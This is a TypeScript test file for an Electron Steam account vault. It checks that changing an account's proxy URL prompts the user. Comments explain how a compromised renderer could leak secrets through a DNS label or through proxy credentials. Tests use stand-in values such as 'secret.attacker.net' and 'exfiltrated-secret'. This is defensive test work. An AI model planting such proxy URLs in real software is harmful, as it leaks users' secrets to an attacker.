import { beforeEach, describe, expect, it, vi } from 'vitest';
import { CHANNELS } from '../src/shared/ipc';
import { __resetRouterForTests, setTrustedSender } from '../src/main/ipc/router';
import { registerVaultHandlers } from '../src/main/vault/ipc';
import type { VaultService } from '../src/main/vault/service';
import { ProxyConsent, type ProxyConsentRequest } from '../src/main/net/proxy-consent';
import { newAutoConfirm, type Account } from '../src/shared/vault-schema';

/**
 * **`accountSetProxy` is a renderer-controlled outbound connection.**
 *
 * The handler validates the address with `planProxy`, which checks the scheme,
 * the port and the credentials and never once looks at the host. So a
 * compromised renderer stores `http://<secret-as-a-label>.attacker.net` and the
 * main process resolves it on the next request, handing the label to whoever
 * runs that zone's nameserver. The connection does not have to succeed; the DNS
 * lookup is the channel, and a Guard code fits in a hostname.
 *
 * `docs/THREAT_MODEL.md` lists "renderer sandboxed, no Node, `connect-src
 * 'none'`" against "a renderer compromise cannot exfiltrate". Those close the
 * channels the renderer can open itself. This was the one it could ask for.
 */

const { handlers } = vi.hoisted(() => ({
	handlers: new Map<string, (event: unknown, request: unknown) => Promise<unknown>>()
}));

vi.mock('electron', () => ({
	ipcMain: {
		handle: (channel: string, handler: (event: unknown, request: unknown) => Promise<unknown>) =>
			handlers.set(channel, handler),
		removeHandler: (channel: string): boolean => handlers.delete(channel)
	}
}));

const STEAM_ID = '76561198000000001';

function account(proxyUrl?: string): Account {
	return {
		steamId64: STEAM_ID,
		accountName: 'trader',
		sharedSecret: 'ASNFZ4mrze8BI0VniavN7wEjRWc=',
		identitySecret: 'ASNFZ4mrze8BI0VniavN7wEjRWc=',
		status: 'active',
		addedAt: '2026-08-01T00:00:00.000Z',
		autoConfirm: newAutoConfirm(),
		...(proxyUrl === undefined ? {} : { proxyUrl })
	};
}

function harness(options: { stored?: string; approve?: boolean } = {}): {
	accounts: Account[];
	asked: ProxyConsentRequest[];
} {
	const accounts = [account(options.stored)];
	const vault = {
		read: () => ({ accounts }),
		settings: () => ({ autoLockMinutes: 10, clipboardClearSeconds: 30, updateCheck: true }),
		mutate: async (apply: (draft: { accounts: Account[] }) => void) => {
			apply({ accounts });
			return Promise.resolve();
		},
		touch: () => undefined,
		isUnlocked: () => true
	} as unknown as VaultService;

	const asked: ProxyConsentRequest[] = [];
	const consent = new ProxyConsent({
		ask: (request) => {
			asked.push(request);
			return Promise.resolve(options.approve ?? true);
		}
	});

	registerVaultHandlers(
		vault,
		undefined,
		undefined,
		undefined,
		undefined,
		undefined,
		undefined,
		consent
	);
	return { accounts, asked };
}

function setProxy(proxyUrl: string | null): Promise<unknown> {
	const handler = handlers.get(CHANNELS.accountSetProxy);
	if (!handler) {
		throw new Error('account:setProxy was never registered');
	}
	return handler(
		{ senderFrame: { url: 'file:///app/out/renderer/index.html' } },
		{ steamId64: STEAM_ID, proxyUrl }
	);
}

beforeEach(() => {
	__resetRouterForTests();
	handlers.clear();
	setTrustedSender(() => true);
});

describe('routing an account through a new address', () => {
	it('is put to the user, named by host and port', async () => {
		const { asked } = harness();
		await setProxy('http://10.0.0.9:8080');

		expect(asked, 'the address was stored without anyone being asked').toHaveLength(1);
		expect(asked[0]?.endpoint).toBe('10.0.0.9:8080');
		expect(asked[0]?.accountName, 'the dialog cannot say whose traffic this is').toBe('trader');
		expect(asked[0]?.reason).toBe('route');
	});

	/*
	 * **Refused before the write, not after it.** A stored address is used by the
	 * next poll, the next enrolment step and the next browser window, so a
	 * refusal that left it in the vault would refuse nothing at all.
	 */
	it('leaves the vault untouched when the answer is no', async () => {
		const { accounts, asked } = harness({ approve: false });

		await expect(setProxy('http://secret.attacker.net:8080')).rejects.toThrow(/not approved/);

		expect(asked).toHaveLength(1);
		expect(
			accounts[0]?.proxyUrl,
			'a refused destination was written to the vault anyway, so the next request uses it'
		).toBeUndefined();
	});

	it('stores it once approved', async () => {
		const { accounts } = harness();
		await setProxy('http://10.0.0.9:8080');
		expect(accounts[0]?.proxyUrl).toBe('http://10.0.0.9:8080');
	});
});

describe('routing an account through the address it already uses', () => {
	/*
	 * Nothing new is being introduced, so there is no decision to make. Asking
	 * anyway is how people are taught to click Allow without reading.
	 */
	it('asks nobody', async () => {
		const { asked } = harness({ stored: 'http://10.0.0.9:8080' });
		await setProxy('http://10.0.0.9:8080');
		expect(asked).toEqual([]);
	});

	it('still asks when the host changes', async () => {
		const { asked } = harness({ stored: 'http://10.0.0.9:8080' });
		await setProxy('http://10.0.0.10:8080');
		expect(asked, 'a different host was adopted without a question').toHaveLength(1);
	});

	/**
	 * **And when only the credentials change, which read as "unchanged".**
	 *
	 * The comparison was `planProxy(...).endpoint` on both sides, so saving the
	 * same approved host with attacker-chosen username and password matched and
	 * skipped the dialog — and the transport then sends those strings to the
	 * proxy on the next authentication. A compromised renderer needs no new
	 * destination for that: the credentials are the payload and the approved
	 * operator is the recipient.
	 */
	it('asks when the credentials change on the same endpoint', async () => {
		const { asked } = harness({ stored: 'http://alice:one@10.0.0.9:8080' });
		await setProxy('http://alice:exfiltrated-secret@10.0.0.9:8080');
		expect(
			asked,
			'attacker-chosen credentials were saved and sent to an approved proxy with no dialog'
		).toHaveLength(1);
	});

	it('asks when credentials are added to an endpoint that had none', async () => {
		const { asked } = harness({ stored: 'http://10.0.0.9:8080' });
		await setProxy('http://carrier:payload@10.0.0.9:8080');
		expect(asked).toHaveLength(1);
	});
});

describe('clearing an account’s proxy', () => {
	/*
	 * Removing routing opens no channel — the traffic goes from this machine's
	 * own address, which is where it would go with no proxy at all. Prompting
	 * here would put a dialog in front of the safer choice.
	 */
	it('asks nobody', async () => {
		const { accounts, asked } = harness({ stored: 'http://10.0.0.9:8080' });
		await setProxy(null);
		expect(asked).toEqual([]);
		expect(accounts[0]?.proxyUrl).toBeUndefined();
	});
});
